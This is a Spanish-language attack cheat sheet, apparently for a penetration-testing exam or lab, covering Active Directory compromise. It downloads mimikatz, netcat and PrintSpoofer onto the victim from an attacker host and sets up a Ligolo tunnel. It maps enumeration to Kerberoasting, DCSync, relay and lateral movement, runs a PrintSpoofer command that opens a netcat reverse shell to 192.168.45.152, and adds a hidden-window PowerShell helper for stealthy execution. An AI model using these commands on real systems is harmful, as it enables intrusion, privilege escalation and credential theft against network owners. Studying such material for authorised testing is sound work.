### Descargar en victima tools

- **Comprimir archivos en zip**

* Opcion 1:
```bash
cd fwindows/     # dentro de la carpeta que tiene todo
zip -r ../tools.zip * 
```

* Opcion 2:
```bash
zip -r tools.zip agent.exe nc.exe PrintSpoofer64.exe mimikatz.exe PowerView.ps1 SharpHound.ps1
```

* Descarga
```powershell
iwr -uri http://192.168.45.152:8000/<selected_tools>.zip -Outfile <tools>.zip
```

* **Descomprimir**

```bash
Expand-Archive tools.zip -DestinationPath .
```

#### Executor

```bash
. .\Executor.ps1
```

### Enumerar
1. Ligolo tunel

```bash
# Kali
ligolo-proxy -selfcert -laddr 0.0.0.0:11601 -v

session

autoroute

# Agregar listener
listener_add --addr <ip_destino:puerto> --to <ip_kali:puerto> --tcp

# victim

Invoke-Ligolo -ip <kali_ip>

.\agent.exe -connect <kali-ip>:11601 -ignore-cert

```

2. bloodhound

```bash
bloodhound-python -u <user> -p <password> -d <domain> -c All -ns <ip> --zip
```

#### Active Directory

[Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

#### Mapa asociativo: Enumeración → Ataque → Movimiento Lateral

| Enumeración (izq)                                                 |                                              Ataque (centro) | Movimiento lateral (der)                                                                  |
| ----------------------------------------------------------------- | -----------------------------------------------------------: | ----------------------------------------------------------------------------------------- |
| Enumeración de SPNs                                               |                                                Kerberoasting | Uso de credenciales de servicio para **WinRM / RDP**                                      |
| Detección de cuentas con Kerberos pre-auth deshabilitado (AS-REP) |                                              AS-REP Roasting | Acceso con credenciales recuperadas → **SMB / PsExec / WinRM**                            |
| Enumeración de usuarios y grupos                                  |                              Password spraying / brute-force | Acceso con credenciales válidas → **RDP / WinRM / SMB**                                   |
| Enumeración de ACLs sobre objetos AD                              |                Abuse de ACLs (escalada de permisos) / DCSync | Obtención de hashes/credenciales → **PsExec / Scheduled Tasks / Remote Service**          |
| Descubrimiento de controladores de dominio / DNS (DC discovery)   |              Exploits en DC / ataques a servicios de dominio | Compromiso del DC → dominio pivot → **lateral a hosts críticos**                          |
| Recolección con BloodHound / SharpHound                           | Identificación de rutas de ataque (paths) → Delegation abuse | Abuso de delegación (constrained/unconstrained) → **Pass-the-Ticket / RDP**               |
| Enumeración de servicios y SPNs vinculados a cuentas de servicio  |                 Kerberoasting / abuso de cuentas de servicio | Uso de cuenta de servicio para **SMB/WinRM** lateral                                      |
| Enumeración de AD CS / plantillas de certificados                 |                           AD CS / Certificate issuance abuse | Emisión de credenciales/certificados → autenticación lateral (**WinRM / LDAP over TLS**)  |
| Enumeración de shares SMB / permisos de archivos                  |                                       NTLM relay / SMB relay | Relay para acceso a servicios remotos → **creación de servicio remoto / lateral por SMB** |
| Enumeración de GPOs y scripts de arranque                         |                        Abuso de GPOs (startup/login scripts) | Inyección de payloads en GPO → **ejecución remota / lateral mediante Scheduled Tasks**    |
| Detección de cuentas de servicio con contraseñas repetidas        |                        Credential reuse / credential dumping | Reutilizar credenciales para **PsExec / RDP / WinRM**                                     |
| Enumeración de políticas de bloqueo/contraseña                    |                Password spraying optimizado / timing attacks | Obtención de acceso persistente → **token impersonation / pivoting**                      |


#### sync DC

```bash
ntpdate <dc-ip>
```

#### bloodyAD

[BloodyAD Cheatsheet](https://seriotonctf.github.io/BloodyAD-Cheatsheet/index.html)


#### Certipy

[Ceripy Cheatsheet](https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/index.html)


#### PowerView

[PowerView CheatSheet-1]( https://1337skills.com/cheatsheets/powerview/#basic-usage)


#### Lateral Movement

* **Evil-Winrm**

#### Printer

```powershell
.\PrintSpoofer64.exe -c "C:\Users\eric.wallows\Documents\nc.exe 192.168.45.152 4444 -e cmd"

Invoke-PrintSpoofer -ip <ip>
```

#### Ejecucion en segundo plano

* Funcion

```powershell
function bg_exec($cmd) {
    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-nop -w hidden -c $cmd"
}
```
* ligolo:
```powershell
bg_exec "C:\Users\eric.wallows\Documents\agent.exe -connect 192.168.45.152:11601 -ignore-cert"
```

#### Help:

```bash
. .\Executor.ps1 -h
```

### Shell upgrade (ver Utils)

```bash 
SHELL=/bin/bash script -q /dev/null
```

#### EP

```bash
Set-ExecutionPolicy RemoteSigned –Scope Process
```
